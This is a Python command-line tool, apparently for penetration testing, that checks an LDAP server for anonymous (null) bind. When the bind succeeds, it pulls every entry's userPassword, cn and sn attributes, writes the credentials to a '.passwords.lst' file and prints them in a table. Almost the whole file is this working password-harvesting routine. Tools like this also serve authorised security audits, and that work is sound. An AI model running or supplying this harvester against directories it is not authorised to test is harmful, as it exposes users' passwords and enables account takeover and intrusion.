from ldap3 import Server, Connection, ALL, SUBTREE
from ldap3.core.exceptions import LDAPException
import logging
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from rich.progress import Progress

class LDAPTester:
    def __init__(self, hostname, port, out, timeout=3):
        self.hostname = hostname
        self.port = port
        self.out = out
        self.timeout = timeout
        self.logger = logging.getLogger(__name__)
        self.console = Console()
        self.server = Server(f"{self.hostname}:{self.port}", get_info=ALL)

    def null_bind(self):
        try:
            self.logger.info("Testing host %s", self.hostname)
            self.conn = Connection(self.server, auto_bind=True)
            self.logger.info("Null bind is allowed, making a search to catch INSUFFICIENT_ACCESS error.")
            self.conn.search(search_base='', search_filter='(objectClass=*)', search_scope=SUBTREE, attributes=['*'])
            self.logger.info("Null bind allowed for host %s", self.hostname)
            return True
        except LDAPException as e:
            self.logger.error("Error while testing null bind: %s", e)
            return False

    def find_passwords(self):
        self.passwords = []
        try:
            self.logger.info("Looking for passwords")
            self.conn.search(search_base='', search_filter='(objectClass=*)', search_scope=SUBTREE, attributes=['userPassword', 'cn', 'sn'])
            for entry in self.conn.entries:
                self.passwords.append([entry.entry_dn, entry.userPassword.value, entry.cn.value, entry.sn.value])
        except LDAPException as e:
            self.logger.error("Error while finding passwords: %s", e)

    def dump_passwords(self):
        filename = f"{self.out}/{self.hostname}.passwords.lst"
        self.logger.info("Dumping passwords into %s", filename)
        try:
            with open(filename, "w") as out:
                for passwd in self.passwords:
                    out.write(f"{passwd[0]}:{passwd[1]}:{passwd[2]}\n")
        except Exception as e:
            self.logger.error("Error while dumping passwords: %s", e)

def setup_logger():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
    logger = logging.getLogger(__name__)
    logger.addHandler(logging.StreamHandler())
    return logger

def main():
    logger = setup_logger()
    console = Console()

    console.print(Panel("LDAP Tester", title="Welcome", subtitle="Test LDAP Servers", border_style="bold blue"))

    while True:
        hostname = Prompt.ask("Enter the LDAP server hostname")
        port = Prompt.ask("Enter the LDAP server port", default="389")
        output_dir = Prompt.ask("Enter the output directory")

        if Confirm.ask(f"Are you sure you want to test LDAP server {hostname}:{port} and save results to {output_dir}?"):
            break

    ldapTester = LDAPTester(hostname, int(port), output_dir)

    with Progress() as progress:
        task = progress.add_task("[cyan]Testing null bind...", total=None)
        
        if ldapTester.null_bind():
            progress.update(task, advance=1)
            console.print("[green]Null bind successful![/green]")
            
            task = progress.add_task("[cyan]Finding passwords...", total=None)
            ldapTester.find_passwords()
            progress.update(task, advance=1)
            
            task = progress.add_task("[cyan]Dumping passwords...", total=None)
            ldapTester.dump_passwords()
            progress.update(task, advance=1)
            
            console.print(f"[blue]Results saved to {output_dir}/{hostname}.passwords.lst[/blue]")
            
            table = Table(show_header=True, header_style="bold magenta")
            table.add_column("DN", style="dim", width=40)
            table.add_column("Password", style="dim", width=30)
            table.add_column("CN", style="dim", width=20)
            table.add_column("SN", style="dim", width=20)

            for passwd in ldapTester.passwords:
                table.add_row(passwd[0], passwd[1] if passwd[1] else "N/A", passwd[2] if passwd[2] else "N/A", passwd[3] if passwd[3] else "N/A")

            console.print(table)
        else:
            console.print("[red]Null bind failed! Please check your credentials and server settings.[/red]")

if __name__ == "__main__":
    main()
